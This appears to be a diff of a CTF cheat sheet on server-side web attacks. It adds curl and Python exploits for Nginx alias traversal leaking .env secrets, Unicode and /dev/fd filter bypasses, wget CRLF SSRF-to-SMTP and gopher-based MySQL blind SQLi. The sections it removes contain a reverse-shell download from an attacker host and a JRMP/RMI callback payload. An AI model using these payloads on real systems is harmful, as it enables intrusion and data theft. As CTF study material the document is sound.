@@ -8,6 +8,10 @@
   - [Brace Stripping](#brace-stripping)
   - [Double URL Encoding](#double-url-encoding)
   - [Python os.path.join](#python-ospathjoin)
+- [Nginx Alias Traversal to Leak .env (VolgaCTF 2018)](#nginx-alias-traversal-to-leak-env-volgactf-2018)
+- [/dev/fd Symlink to Bypass /proc Filter (Google CTF 2017)](#devfd-symlink-to-bypass-proc-filter-google-ctf-2017)
+- [Unicode Homoglyph Path Traversal U+2E2E (CSAW 2017)](#unicode-homoglyph-path-traversal-u2e2e-csaw-2017)
+- [Ruby Regexp.escape Multibyte Character Bypass (Square CTF 2017)](#ruby-regexpescape-multibyte-character-bypass-square-ctf-2017)
 - [Flask/Werkzeug Debug Mode Exploitation](#flaskwerkzeug-debug-mode-exploitation)
 - [XXE with External DTD Filter Bypass](#xxe-with-external-dtd-filter-bypass)
 - [Path Traversal: URL-Encoded Slash Bypass](#path-traversal-url-encoded-slash-bypass)
@@ -18,6 +22,8 @@
 - [Pongo2 / Go Template Injection via Path Traversal (Nullcon 2026)](#pongo2--go-template-injection-via-path-traversal-nullcon-2026)
 - [ZIP Upload with PHP Webshell (Nullcon 2026)](#zip-upload-with-php-webshell-nullcon-2026)
 - [basename() Bypass for Hidden Files (Nullcon 2026)](#basename-bypass-for-hidden-files-nullcon-2026)
+- [wget CRLF Injection for SSRF-to-SMTP (SECCON 2017)](#wget-crlf-injection-for-ssrf-to-smtp-seccon-2017)
+- [Gopher SSRF to MySQL Blind SQLi (34C3 CTF 2017, AceBear 2018)](#gopher-ssrf-to-mysql-blind-sqli-34c3-ctf-2017-acebear-2018)
 - [React Server Components Flight Protocol RCE (Ehax 2026)](#react-server-components-flight-protocol-rce-ehax-2026)
   - [Step 1 — Identify RSC via HTTP headers](#step-1--identify-rsc-via-http-headers)
   - [Step 2 — Exploit Flight deserialization for RCE](#step-2--exploit-flight-deserialization-for-rce)
@@ -25,9 +31,7 @@
   - [Step 4 — Bypass WAF keyword filters](#step-4--bypass-waf-keyword-filters)
   - [Step 5 — Post-RCE enumeration](#step-5--post-rce-enumeration)
   - [Step 6 — Lateral movement to internal services](#step-6--lateral-movement-to-internal-services)
-- [SSRF → Docker API RCE Chain (H7CTF 2025)](#ssrf--docker-api-rce-chain-h7ctf-2025)
-- [Castor XML Deserialization via xsi:type Polymorphism (Atlas HTB)](#castor-xml-deserialization-via-xsitype-polymorphism-atlas-htb)
-- [Apache ErrorDocument Expression File Read (Zero HTB)](#apache-errordocument-expression-file-read-zero-htb)
+See also: [server-side-advanced-2.md](server-side-advanced-2.md) for Part 2 (SSRF-to-Docker API RCE, Castor XML xsi:type deserialization, Apache ErrorDocument expression file read, SQLite file path traversal, HQL non-breaking space injection, base64-encoded path traversal, Windows 8.3 short filename bypass, URL parse_url @ symbol bypass, PHP zip:// wrapper LFI, XSS-to-SSTI chain, INSERT INTO column shift SQLi, session cookie forgery via timestamp PRNG).
 
 ---
 
@@ -113,6 +117,183 @@ zip -y exploit.zip file.txt
 
 ### Python os.path.join
 `os.path.join('/app/public', '/etc/passwd')` → `/etc/passwd` (absolute path ignores prefix)
+
+---
+
+### Nginx Alias Traversal to Leak .env (VolgaCTF 2018)
+
+**Pattern:** Nginx `alias` misconfiguration allows path traversal when a `location` block's path doesn't end with `/` but the `alias` does. The path remainder is appended unsafely, allowing `..` traversal out of the aliased directory.
+
+```nginx
+# Vulnerable Nginx configuration:
+location /laravel {
+    alias /var/www/html/public/;
+}
+# Note: /laravel has NO trailing slash, but alias has one
+# This creates a join mismatch: /laravel<anything> maps to /var/www/html/public/<anything>
+```
+
+```bash
+# Exploit: traverse out of the public/ directory to read .env
+GET /laravel../.env HTTP/1.1
+# Nginx resolves: alias "/var/www/html/public/" + "../.env" = /var/www/html/.env
+
+# Read application source
+GET /laravel../app/Http/Controllers/AuthController.php HTTP/1.1
+
+# Read other config files
+GET /laravel../config/database.php HTTP/1.1
+GET /laravel../storage/logs/laravel.log HTTP/1.1
+```
+
+```python
+import requests
+
+target = "http://target"
+
+# Leak Laravel .env file (contains APP_KEY, DB credentials, etc.)
+r = requests.get(f"{target}/laravel../.env")
+if r.status_code == 200:
+    print("[+] .env contents:")
+    print(r.text)
+    # Look for APP_KEY, DB_PASSWORD, API keys, etc.
+```
+
+**Detection checklist:**
+```text
+# Test for the misconfiguration on common paths:
+/static../
+/assets../
+/public../
+/media../
+/uploads../
+/laravel../
+# Any location block using alias without matching trailing slashes
+```
+
+**Key insight:** When an Nginx `location` directive lacks a trailing slash but its `alias` has one, the path is joined unsafely, allowing `..` traversal out of the aliased directory. This is a common misconfiguration in Laravel deployments where `/laravel` maps to the `public/` directory. Always check for trailing slash mismatches between `location` and `alias` directives.
+
+---
+
+## Unicode Homoglyph Path Traversal U+2E2E (CSAW 2017)
+
+**Pattern:** U+2E2E (REVERSED QUESTION MARK, UTF-8: `E2 B8 AE`) normalizes to a period (U+002E, 0x2E) in some Python HTTP backends and Unicode normalization layers. Sending `%E2%B8%AE%E2%B8%AE/flag.txt` bypasses ASCII dot checks (`..` blocked) while the resolved path becomes `../flag.txt`.
+
+```bash
+# Standard path traversal blocked by ASCII dot check:
+curl "http://target/files/../../flag.txt"   # blocked: contains ".."
+
+# U+2E2E homoglyph bypass:
+curl "http://target/files/%E2%B8%AE%E2%B8%AE/flag.txt"
+# Backend normalizes E2B8AE → 0x2E (period), resolves as ../flag.txt
+```
+
+```python
+import requests
+
+# U+2E2E = REVERSED QUESTION MARK (⸮), UTF-8: 0xE2 0xB8 0xAE
+# Normalizes to FULL STOP (.) in NFKC/NFC after some transformations
+
+homoglyph_dot = '\u2E2E'
+payload = f"{homoglyph_dot}{homoglyph_dot}/flag.txt"
+
+r = requests.get(f"http://target/files/{payload}")
+# If backend normalizes Unicode before filesystem access but after validation:
+print(r.text)
+```
+
+**Other Unicode dot homoglyphs to try:**
+```text
+U+2E2E  ⸮  REVERSED QUESTION MARK  (E2 B8 AE) → .
+U+FF0E  ．  FULLWIDTH FULL STOP     (EF BC 8E) → .
+U+2024  ․  ONE DOT LEADER          (E2 80 A4) → .
+U+FE52  ﹒  SMALL FULL STOP        (EF B9 92) → .
+```
+
+**Key insight:** Unicode normalization inconsistencies between the validation layer and execution layer enable path traversal with non-ASCII dot homoglyphs. U+2E2E is a lesser-known alternative to fullwidth tricks (U+FF0E). Test normalization forms NFKC and NFC — Python's `unicodedata.normalize('NFKC', char)` reveals what each character collapses to.
+
+---
+
+## Ruby Regexp.escape Multibyte Character Bypass (Square CTF 2017)
+
+**Pattern:** Ruby's `Regexp.escape` operates byte-by-byte. A `%bf` byte followed by `%5c` (backslash) forms a valid GBK/Big5 multibyte character, consuming the backslash. This leaves subsequent characters unescaped, breaking the intended regex escaping.
+
+```ruby
+# Regexp.escape escapes special chars by prepending backslash
+# e.g., Regexp.escape("a.b") → "a\\.b"
+
+# Vulnerability: byte 0xBF followed by 0x5C (backslash) is a valid GBK character
+# Regexp.escape sees 0xBF → not a special char, passes through
+# Then sees 0x5C → escapes it to 0x5C 0x5C (double backslash)
+# But in GBK: 0xBF 0x5C is ONE character (the lead byte absorbs the backslash)
+# So the "escape" produces: 0xBF 0x5C 0x5C = GBK_char + 0x5C
+# The second backslash then escapes the NEXT character, not the intended one
+
+# Result: subsequent input characters become unescaped in the regex
+```
+
+```python
+# In a CTF context: HTTP request with GBK lead byte in parameter
+import requests
+
+# %bf%5c in URL-encoded form — in GBK this is one character
+# When Ruby calls Regexp.escape on the input, the backslash is consumed
+payload = "\xbf\x5c" + ".*"   # GBK char eats the backslash; .* is now unescaped in regex
+
+r = requests.get("http://target/search", params={"q": payload})
+# If backend uses: /#{Regexp.escape(params[:q])}/  as a regex pattern
+# The .* passes through unescaped, matching any string
+```
+
+**Exploitation scenario:**
+```ruby
+# Vulnerable code:
+pattern = /#{Regexp.escape(user_input)}/
+if flag.match(pattern)
+  puts "Match!"
+end
+
+# Inject: "\xbf\x5c.*" → Regexp.escape produces "\xbf\\\\..*"
+# In GBK context: first two bytes are one char, leaving ".*" unescaped
+# Pattern becomes: /\xbf\\.*/ which in GBK matches the flag (greedy .*)
+```
+
+**Key insight:** Byte-level escaping functions are vulnerable to multibyte character injection. A GBK/Big5 lead byte (0xBF) followed by 0x5C forms a valid single character, consuming the backslash that `Regexp.escape` just added. This leaves subsequent characters unescaped. Check for non-ASCII input handling in Ruby regex validation, especially when the application supports CJK character sets.
+
+---
+
+## /dev/fd Symlink to Bypass /proc Filter (Google CTF 2017)
+
+**Pattern:** When an application filters `/proc` in file read parameters to prevent access to process information, `/dev/fd` provides an alternative path since it is a symlink to `/proc/self/fd` on Linux.
+
+```bash
+# Bypass /proc filter to read environment variables
+curl "http://target/?f=/dev/fd/../environ"
+# /dev/fd -> /proc/self/fd, then ../ traverses to /proc/self/
+
+# Read command line
+curl "http://target/?f=/dev/fd/../cmdline"
+
+# Read memory maps
+curl "http://target/?f=/dev/fd/../maps"
+
+# Read specific file descriptor contents
+curl "http://target/?f=/dev/fd/0"   # stdin
+curl "http://target/?f=/dev/fd/1"   # stdout
+curl "http://target/?f=/dev/fd/3"   # often a database or config file
+```
+
+**Other /proc filter bypass paths:**
+```text
+/dev/fd/../environ         # → /proc/self/environ
+/dev/fd/../cmdline         # → /proc/self/cmdline
+/dev/fd/../maps            # → /proc/self/maps
+/dev/fd/../status          # → /proc/self/status
+/dev/fd/../cwd/app.py      # → /proc/self/cwd/app.py (working dir)
+/dev/stdin/../environ      # /dev/stdin → /proc/self/fd/0, then ../
+```
+
+**Key insight:** `/dev/fd` is a symlink to `/proc/self/fd` on Linux. Traversing up with `../` reaches `/proc/self/`, bypassing blocklist checks for the literal string `/proc`. Similarly, `/dev/stdin`, `/dev/stdout`, and `/dev/stderr` link into `/proc/self/fd/` and can be used as traversal pivot points. Always test these alternatives when `/proc` is blacklisted.
 
 ---
 
@@ -338,6 +519,111 @@ curl "http://target/?view_receipt=secret_XXXXXXXX"
 
 ---
 
+## wget CRLF Injection for SSRF-to-SMTP (SECCON 2017)
+
+**Pattern:** wget versions before 1.17.1 (notably 1.14, common on CentOS 7) do not sanitize CRLF characters (`%0d%0a`) in the HTTP Host header. When an SSRF allows controlling the URL that wget fetches, CRLF injection into the hostname allows injecting arbitrary protocol commands. Targeting an internal SMTP server on port 25 enables sending arbitrary emails.
+
+```text
+# CRLF-injected URL targeting internal SMTP on port 25:
+# Key: the port :25/ must come at the END to avoid "Bad port number" errors
+http://127.0.0.1%0D%0AHELO%20x%0D%0AMAIL%20FROM%3A%3Cattacker%40x.com%3E%0D%0ARCPT%20TO%3A%3Croot%3E%0D%0ADATA%0D%0ASubject%3A%20give%20me%20flag%0D%0Aabc%0D%0A.%0D%0A:25/
+```
+
+```python
+import requests
+import urllib.parse
+
+# Build the CRLF-injected SMTP conversation
+smtp_commands = "\r\n".join([
+    "HELO x",
+    "MAIL FROM:<attacker@x.com>",
+    "RCPT TO:<root>",
+    "DATA",
+    "Subject: give me flag",
+    "",
+    "Send me the flag please",
+    ".",
+])
+
+# URL-encode the SMTP commands for injection into the hostname
+encoded = urllib.parse.quote(smtp_commands, safe='')
+
+# Port must be at the end to avoid wget "Bad port number" error
+ssrf_url = f"http://127.0.0.1{encoded}:25/"
+
+# Trigger the SSRF
+requests.post("http://target/fetch", data={"url": ssrf_url})
+# wget connects to 127.0.0.1:25 and sends the SMTP commands as part of the HTTP request
+# The SMTP server processes the injected commands and delivers the email
+```
+
+**Key insight:** wget before 1.17.1 did not sanitize CRLF in the Host header. When SSRF reaches an internal SMTP service, CRLF injection enables sending arbitrary emails. Place the port at the END of the injected string to avoid "Bad port number" errors. This technique extends to any line-based protocol accessible via SSRF (FTP, Redis, memcached). See also [server-side.md](server-side.md#ssrf) for other SSRF techniques.
+
+---
+
+## Gopher SSRF to MySQL Blind SQLi (34C3 CTF 2017, AceBear 2018)
+
+**Pattern:** When SSRF allows the `gopher://` protocol, craft raw MySQL protocol packets to communicate with a local MySQL instance that uses passwordless authentication (common in CTF setups). Combine with time-based blind SQLi via `SLEEP()` to extract data.
+
+```python
+import urllib.parse
+import requests
+import time
+
+# Step 1: Capture a real MySQL session with tcpdump
+# tcpdump -i lo port 3306 -w mysql.pcap
+# Connect to MySQL normally: mysql -u root
+# Execute a simple query, then disconnect
+# Extract the client auth packet and query packet bytes from the pcap
+
+# Step 2: Build the gopher payload
+# MySQL auth packet (handshake response) - extract from pcap
+auth_packet = bytearray([
+    0x48, 0x00, 0x00, 0x01,  # packet length + sequence
+    0x85, 0xa6, 0x03, 0x00,  # client capabilities
+    # ... remaining auth packet bytes from tcpdump capture
+])
+
+# MySQL query packet
+def build_query_packet(sql):
+    payload = b'\x03' + sql.encode()  # 0x03 = COM_QUERY
+    length = len(payload)
+    # MySQL packet: 3-byte length (little-endian) + 1-byte sequence number
+    header = length.to_bytes(3, 'little') + b'\x00'
+    return header + payload
+
+# Step 3: Time-based blind extraction
+flag = ""
+for pos in range(1, 50):
+    for char in "abcdefghijklmnopqrstuvwxyz0123456789_{}-":
+        query = f"SELECT IF(SUBSTRING((SELECT flag FROM secrets LIMIT 1),{pos},1)='{char}',SLEEP(3),0)"
+        query_packet = build_query_packet(query)
+
+        # Combine auth + query, URL-encode for gopher
+        raw_data = bytes(auth_packet) + bytes(query_packet)
+        encoded = urllib.parse.quote(raw_data, safe='')
+
+        # Double-encode if the SSRF handler URL-decodes once
+        double_encoded = urllib.parse.quote(encoded, safe='')
+
+        gopher_url = f"gopher://127.0.0.1:3306/_{double_encoded}"
+
+        start = time.time()
+        requests.get("http://target/fetch", params={"url": gopher_url})
+        elapsed = time.time() - start
+
+        if elapsed > 3.0:
+            flag += char
+            print(f"Flag so far: {flag}")
+            break
+
+print(f"Final flag: {flag}")
+```
+
+**Key insight:** `gopher://` sends raw TCP data, enabling communication with any TCP service. Capture a legitimate MySQL session with `tcpdump`, then replay the auth + query bytes via gopher. Use passwordless MySQL accounts (common in CTF setups). Double-URL-encode the payload when the SSRF handler URL-decodes once. This technique also works against PostgreSQL, Redis, and other TCP services accessible from the SSRF context. See also [sql-injection.md](sql-injection.md) for SQL injection techniques.
+
+---
+
 ## React Server Components Flight Protocol RCE (Ehax 2026)
 
 **Pattern (Flight Risk):** Next.js app using React Server Components (RSC). The Flight protocol deserializes client-sent objects on the server. A crafted fake Flight chunk exploits the constructor chain (`constructor → constructor → Function`) for arbitrary code execution (CVE-2025-55182).
@@ -469,121 +755,3 @@ throw Object.assign(new Error('NEXT_REDIRECT'),
 **Full exploit chain:** Identify RSC headers → craft fake Flight chunk → bypass WAF → achieve RCE → enumerate filesystem → discover internal services → lateral movement via `nc` to retrieve flag.
 
 **Detection:** `Accept: text/x-component` + `Next-Action` header in requests, `createServerReference()` in client JS, Next.js Server Actions with user-controlled form data.
-
----
-
-## SSRF → Docker API RCE Chain (H7CTF 2025)
-
-**Pattern (Moby Dock):** Web app with SSRF vulnerability exposes unauthenticated Docker daemon API on port 2375. Chain SSRF through an internal proxy endpoint to relay POST requests and achieve RCE.
-
-**Step 1 — Discover internal services via SSRF:**
-```bash
-# Enumerate localhost ports through SSRF
-curl "http://target/validate?url=http://localhost:2375/version"
-curl "http://target/validate?url=http://localhost:8090/docs"
-```
-
-**Step 2 — Extract files from running containers via Docker archive endpoint:**
-```bash
-# List containers
-curl "http://target/validate?url=http://localhost:2375/containers/json"
-
-# Read files from container filesystem (returns tar archive)
-curl "http://target/validate?url=http://localhost:2375/v1.51/containers/<container_id>/archive?path=/flag.txt"
-```
-
-**Step 3 — Execute commands via Docker exec API (requires POST relay):**
-
-When SSRF only allows GET requests, find an internal endpoint that can relay POST requests (e.g., `/request?method=post&data=...&url=...`).
-
-```bash
-# 1. Create exec instance
-curl "http://target/validate?url=http://localhost:8090/request?method=post\
-&data={\"AttachStdout\":true,\"Cmd\":[\"cat\",\"/flag.txt\"]}\
-&url=http://localhost:2375/v1.51/containers/<id>/exec"
-# Returns: {"Id": "<exec_id>"}
-
-# 2. Start exec instance
-curl "http://target/validate?url=http://localhost:8090/request?method=post\
-&data={\"Detach\":false,\"Tty\":false}\
-&url=http://localhost:2375/v1.51/exec/<exec_id>/start"
-```
-
-**For reverse shell access:**
-```bash
-# 1. Download shell script into container
-# Cmd: ["wget", "http://attacker/shell.sh", "-O", "/tmp/shell.sh"]
-
-# 2. Execute with sh (not bash — busybox containers lack bash)
-# Cmd: ["sh", "/tmp/shell.sh"]
-```
-
-**Key Docker API endpoints for exploitation:**
-| Endpoint | Method | Purpose |
-|----------|--------|---------|
-| `/version` | GET | Confirm Docker API access |
-| `/containers/json` | GET | List running containers |
-| `/containers/<id>/archive?path=<path>` | GET | Extract files (tar format) |
-| `/containers/<id>/exec` | POST | Create exec instance |
-| `/exec/<id>/start` | POST | Run exec instance |
-| `/images/json` | GET | List available images |
-| `/containers/create` | POST | Create new container |
-
-**Key insight:** Unauthenticated Docker daemons on port 2375 give full container control. When SSRF is GET-only, look for internal proxy or request-relay endpoints that forward POST requests. Use `sh` instead of `bash` in minimal containers (busybox, alpine).
-
----
-
-## Castor XML Deserialization via xsi:type Polymorphism (Atlas HTB)
-
-**Pattern:** Castor XML `Unmarshaller` without mapping file trusts `xsi:type` attributes, allowing arbitrary Java class instantiation.
-
-**Attack chain:** `xsi:type` → `PropertyPathFactoryBean` + `SimpleJndiBeanFactory` → JNDI/RMI → ysoserial JRMP listener → `CommonsBeanutils1` gadget → RCE
-
-**Requires:** Java 11 (not 17+) — ysoserial gadgets fail on Java 17+ due to module access restrictions.
-
-**XML payload example with Spring beans for RMI callback:**
-```xml
-<data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-      xmlns:java="http://java.sun.com">
-  <item xsi:type="java:org.springframework.beans.factory.config.PropertyPathFactoryBean">
-    <targetBeanName>
-      <item xsi:type="java:org.springframework.jndi.support.SimpleJndiBeanFactory">
-        <shareableResources>rmi://ATTACKER:1099/exploit</shareableResources>
-      </item>
-    </targetBeanName>
-    <propertyPath>foo</propertyPath>
-  </item>
-</data>
-```
-
-```bash
-# Start ysoserial JRMP listener
-java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 'bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}'
-```
-
-**Key insight:** Castor XML without explicit mapping files is effectively an XML-based deserialization sink. The `xsi:type` attribute acts like Java's `ObjectInputStream` — any class on the classpath can be instantiated. Check `pom.xml` for `castor-xml`, `commons-beanutils`, and `commons-collections` dependencies. JNDI (Java Naming and Directory Interface) via RMI (Remote Method Invocation) provides the callback mechanism.
-
-**Detection:** Java app using Castor XML for deserialization, `castor-xml` in `pom.xml`, `commons-beanutils`/`commons-collections` dependencies.
-
----
-
-## Apache ErrorDocument Expression File Read (Zero HTB)
-
-**Pattern:** Apache's `ErrorDocument` directive with expression syntax reads files at the Apache level, bypassing PHP engine disable.
-
-**Requires:** `AllowOverride FileInfo` in userdir config.
-
-**Attack chain:**
-1. Upload `.htaccess` to subdirectory via SFTP (Secure File Transfer Protocol):
-```apache
-ErrorDocument 404 "%{file:/etc/passwd}"
-```
-2. Request a nonexistent URL in that directory to trigger the 404 handler
-3. Read PHP source via `cat -v` to see raw content:
-```apache
-ErrorDocument 404 "%{file:/var/www/html/stats.php}"
-```
-
-**Key insight:** Works even when `php_admin_flag engine off` disables PHP execution in user directories. The `%{file:...}` expression is evaluated by Apache itself, not PHP — so PHP disable flags are irrelevant.
-
-**Detection:** Apache with `mod_userdir`, `AllowOverride FileInfo`, writable `.htaccess` in subdirectories.
